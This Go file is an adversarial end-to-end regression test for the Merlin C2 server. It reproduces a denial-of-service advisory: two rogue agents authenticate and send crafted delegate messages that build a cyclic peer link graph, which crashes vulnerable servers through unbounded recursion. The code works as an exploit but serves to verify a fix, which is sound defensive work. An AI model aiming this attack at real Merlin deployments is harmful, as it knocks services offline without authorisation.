// Command e2e-negative is an adversarial end-to-end test for the Merlin server. The
// surrounding run.sh starts a merlinServer; this program then drives the operator gRPC
// API to create an HTTP listener, stands up two rogue agents using the real
// merlin-agent HTTP client (full OPAQUE authentication, JWE/gob transforms and a
// PSK-signed JWT over real HTTP), and launches the peer-to-peer link-graph cycle
// attack from GHSA-j4v3-8vg5-7p7g.
//
// Agent A links to agent B and agent B links back to A (a two-node cycle that the
// self-link guard does not reject), then A checks in, forcing the server to walk the
// cyclic link graph. A vulnerable server recurses until the goroutine stack overflows
// and the process dies; a fixed server detects the cycle and responds normally.
//
// Exit 0 means the server survived the attack and is still responsive; non-zero means
// a step failed or the server did not survive.
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/metadata"
	"google.golang.org/protobuf/types/known/emptypb"

	httpclient "github.com/Ne0nd0g/merlin-agent/v2/clients/http"
	messages "github.com/Ne0nd0g/merlin-message"
	// Blank import so merlin-message/jobs' init() registers its gob types (e.g.
	// []jobs.Job, Command); the server's responses embed them and the agent client
	// must be able to gob-decode them, exactly as the real agent binary does.
	_ "github.com/Ne0nd0g/merlin-message/jobs"
	pb "github.com/Ne0nd0g/merlin/v2/pkg/rpc"
)

// userAgent is a benign value; it deliberately avoids the fingerprint string the server
// warns about so the test does not trip unrelated log noise.
const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

var client pb.MerlinClient

func main() {
	addr := flag.String("addr", "127.0.0.1:50051", "Merlin server gRPC address")
	password := flag.String("password", "merlin", "RPC client password")
	lhost := flag.String("lhost", "127.0.0.1", "listener interface")
	port := flag.String("port", "28080", "listener port")
	psk := flag.String("psk", "merlin", "listener/agent pre-shared key")
	timeout := flag.Duration("timeout", 60*time.Second, "overall timeout")
	flag.Parse()

	if err := run(*addr, *password, *lhost, *port, *psk, *timeout); err != nil {
		fmt.Fprintf(os.Stderr, "\nNEGATIVE E2E FAILED: %s\n", err)
		os.Exit(1)
	}
	fmt.Println("\nNEGATIVE E2E PASSED ✔  (server survived the p2p link-graph cycle attack)")
}

func run(addr, password, lhost, port, psk string, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// Mirror the CLI: always dial TLS (the server serves a self-signed cert) and attach
	// the password as "authorization" metadata on every call.
	unary := func(c context.Context, method string, req, reply any, cc *grpc.ClientConn, invoker grpc.UnaryInvoker, opts ...grpc.CallOption) error {
		return invoker(metadata.AppendToOutgoingContext(c, "authorization", password), method, req, reply, cc, opts...)
	}
	conn, err := grpc.NewClient(addr,
		grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{InsecureSkipVerify: true})), // #nosec G402 - local self-signed server
		grpc.WithUnaryInterceptor(unary),
	)
	if err != nil {
		return fmt.Errorf("dial %s: %w", addr, err)
	}
	defer func() { _ = conn.Close() }()
	client = pb.NewMerlinClient(conn)

	// Create and start a clear-text HTTP listener from the server defaults.
	def, err := client.GetListenerDefaultOptions(ctx, &pb.String{Data: "http"})
	if err != nil {
		return fmt.Errorf("GetListenerDefaultOptions: %w", err)
	}
	o := def.GetOptions()
	if o == nil {
		o = map[string]string{}
	}
	o["Protocol"] = "HTTP"
	o["Interface"] = lhost
	o["Port"] = port
	o["PSK"] = psk
	o["Name"] = "e2e-negative"

	before := idSet(listenerIDs(ctx))
	if _, err = client.CreateListener(ctx, &pb.Options{Options: o}); err != nil {
		return fmt.Errorf("CreateListener: %w", err)
	}
	lid := firstNew(listenerIDs(ctx), before)
	if lid == "" {
		return fmt.Errorf("no new listener id after CreateListener")
	}
	if _, err = client.StartListener(ctx, &pb.ID{Id: lid}); err != nil {
		return fmt.Errorf("StartListener: %w", err)
	}
	defer func() {
		dctx, dc := context.WithTimeout(context.Background(), 5*time.Second)
		defer dc()
		_, _ = client.StopListener(dctx, &pb.ID{Id: lid})
		_, _ = client.RemoveListener(dctx, &pb.ID{Id: lid})
	}()
	url := fmt.Sprintf("http://%s:%s/", lhost, port)
	step("listener %s started on %s", lid, url)

	// Give the listener a moment to bind before agents dial it.
	time.Sleep(500 * time.Millisecond)

	// Stand up two rogue agents using the real agent client (full OPAQUE handshake).
	a, err := newRogueAgent(url, psk)
	if err != nil {
		return fmt.Errorf("rogue agent A: %w", err)
	}
	step("rogue agent A authenticated: %s", a.id)
	b, err := newRogueAgent(url, psk)
	if err != nil {
		return fmt.Errorf("rogue agent B: %w", err)
	}
	step("rogue agent B authenticated: %s", b.id)

	// Build the attack graph using the reporter's minimal shape: a self-linked agent B
	// plus an entry agent A that links to B (A->B, B->B). The server skips delegate
	// processing for any agent that is already somebody's child, so B must self-link
	// before anything else and A must stay nobody's child so its check-in is processed
	// directly. On a vulnerable server A's check-in then walks A->B->B->B... forever and
	// the process stack-overflows; on a fixed server the self-link is rejected at
	// insertion, so no loop forms and the walk terminates.
	//
	// The sends are best-effort: these crafted messages often get an empty/no-op reply,
	// so the agent's view of each response is not meaningful. Whether the SERVER survived
	// is the authoritative signal, checked over gRPC below.
	bestEffortSend(b, delegateMessage(b.id, b.id), "B self-link delegate (B->B)")
	bestEffortSend(a, delegateMessage(a.id, b.id), "A link delegate (A->B)")
	bestEffortSend(a, checkinMessage(a.id), "A check-in (triggers the link-graph walk)")

	// The server survived the attack iff it is still responsive over gRPC. A crash
	// (stack overflow) kills the process, so this call fails.
	if _, err = client.GetListenerIDs(ctx, &emptypb.Empty{}); err != nil {
		return fmt.Errorf("server is unresponsive after the attack - it likely crashed walking the cycle: %w", err)
	}
	step("server still responsive over gRPC after the attack")
	return nil
}

// bestEffortSend sends a message through a rogue agent and logs the outcome without
// aborting. The crafted attack messages often draw an empty/no-op reply (reported by
// the client as an error), which is not a failure of the test: the server's survival,
// checked over gRPC afterward, is what the test asserts.
func bestEffortSend(ra *rogueAgent, msg messages.Base, label string) {
	if _, err := ra.client.Send(msg); err != nil {
		step("%s sent (agent-side reply note: %v)", label, err)
		return
	}
	step("%s sent", label)
}

// rogueAgent is a minimal attacker-controlled agent backed by the real merlin-agent
// HTTP client, so authentication and the wire format are exactly what a real agent uses.
type rogueAgent struct {
	id     uuid.UUID
	client *httpclient.Client
}

func newRogueAgent(url, psk string) (*rogueAgent, error) {
	id := uuid.New()
	c, err := httpclient.New(httpclient.Config{
		AgentID:      id,
		Protocol:     "http",
		URL:          []string{url},
		PSK:          psk,
		AuthPackage:  "opaque",
		Transformers: "jwe,gob-base",
		UserAgent:    userAgent,
	})
	if err != nil {
		return nil, fmt.Errorf("new client: %w", err)
	}
	if err = c.Initial(); err != nil {
		return nil, fmt.Errorf("OPAQUE authentication: %w", err)
	}
	return &rogueAgent{id: id, client: c}, nil
}

// delegateMessage builds a check-in carrying a single delegate that names child as a
// peer-to-peer child of parent. The listener UUID is random: the server cannot find it,
// falls back to brute forcing its listeners against the empty payload (which never
// errors), and in doing so creates the parent -> child link.
func delegateMessage(parent, child uuid.UUID) messages.Base {
	return messages.Base{
		ID:   parent,
		Type: messages.CHECKIN,
		Delegates: []messages.Delegate{{
			Listener: uuid.New(),
			Agent:    child,
			Payload:  []byte{},
		}},
	}
}

func checkinMessage(id uuid.UUID) messages.Base {
	return messages.Base{ID: id, Type: messages.CHECKIN}
}

func listenerIDs(ctx context.Context) []string {
	s, err := client.GetListenerIDs(ctx, &emptypb.Empty{})
	if err != nil {
		return nil
	}
	return s.GetData()
}

func idSet(ids []string) map[string]bool {
	m := make(map[string]bool, len(ids))
	for _, id := range ids {
		m[id] = true
	}
	return m
}

func firstNew(after []string, before map[string]bool) string {
	for _, id := range after {
		if !before[id] {
			return id
		}
	}
	return ""
}

func step(format string, a ...any) {
	fmt.Printf("  • "+format+"\n", a...)
}
